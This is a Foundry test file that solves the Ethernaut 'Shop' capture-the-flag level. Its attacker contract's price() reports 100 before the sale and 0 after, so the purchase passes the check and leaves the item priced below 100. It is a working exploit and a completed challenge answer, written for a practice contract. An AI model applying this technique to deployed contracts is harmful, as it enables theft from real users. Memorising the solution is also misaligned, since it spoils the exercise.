// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Shop} from "../src/Shop.sol";

/// @dev Buyer whose price() returns different values on successive calls.
///      Does not implement IBuyer — that interface marks price() as view, but
///      Shop still calls it and we need to update state between calls.
contract AttackShop {
    Shop public immutable target;

    constructor(Shop _target) {
        target = _target;
    }

    function attack() external {
        target.buy();
    }

    function price() external view returns (uint256) {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // First call (!isSold): return >= 100 to pass the check.
        // Second call (isSold): return 0 so the shop price becomes cheap.
        return target.isSold() ? 0 : 100;
        // ========== END ATTACK LOGIC ==========
    }
}

contract ShopTest is Test {
    Shop public target;
    AttackShop public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        target = new Shop();
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackShop(target);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   target.isSold() == true
        //   target.price() < 100
        //
        // Shop checks price >= 100 before buying, then sets price to the
        // second price() result. A stateful buyer can pass the check once
        // and report a cheaper price on the follow-up call.
        //
        // Tip:
        //   vm.startPrank(attacker);
        //   attackContract.attack();
        //   vm.stopPrank();

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        attackContract.attack();
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertTrue(target.isSold(), "item should be sold");
        assertLt(target.price(), 100, "final price should be below 100");
    }
}
